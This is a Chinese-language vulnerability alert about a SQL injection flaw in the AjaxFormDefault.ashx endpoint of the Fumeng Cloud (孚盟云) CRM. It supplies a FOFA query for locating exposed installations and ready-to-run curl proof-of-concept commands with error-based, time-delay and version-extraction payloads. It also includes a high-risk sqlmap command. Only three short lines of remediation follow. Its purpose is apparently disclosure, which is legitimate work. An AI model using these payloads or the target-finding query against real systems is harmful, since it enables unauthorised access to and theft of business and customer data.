---
title: 【漏洞预警】孚盟云CRM AjaxFormDefault SQL注入漏洞
---

## 漏洞概述
孚盟云CRM系统AjaxFormDefault.ashx接口存在SQL注入漏洞，攻击者可通过构造恶意参数获取数据库敏感信息。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 孚盟云CRM AjaxFormDefault.ashx接口SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | AjaxFormDefault.ashx |
| 严重程度 | 高危 |

## FOFA查询
```
app="孚盟软件-孚盟云"
```

## POC
```bash
# 报错注入检测
curl -X POST "http://target/m/Dingding/Ajax/AjaxFormDefault.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=sendProductMessage&DetailID=' and 1=CONVERT(int,char(126)%2bchar(78)%2bchar(106)%2bchar(126))--"

# 延时注入检测
curl -X POST "http://target/m/Dingding/Ajax/AjaxFormDefault.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=sendProductMessage&DetailID=' waitfor delay'0:0:5'--"

# 获取数据库版本
curl -X POST "http://target/m/Dingding/Ajax/AjaxFormDefault.ashx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=sendProductMessage&DetailID=' and @@version--"
```

使用sqlmap:
```bash
sqlmap -u "http://target/m/Dingding/Ajax/AjaxFormDefault.ashx" \
  --data="action=sendProductMessage&DetailID=test" \
  --level=5 --risk=3
```

## 修复建议
1. 使用参数化查询
2. 实施严格输入验证
3. 升级到最新版本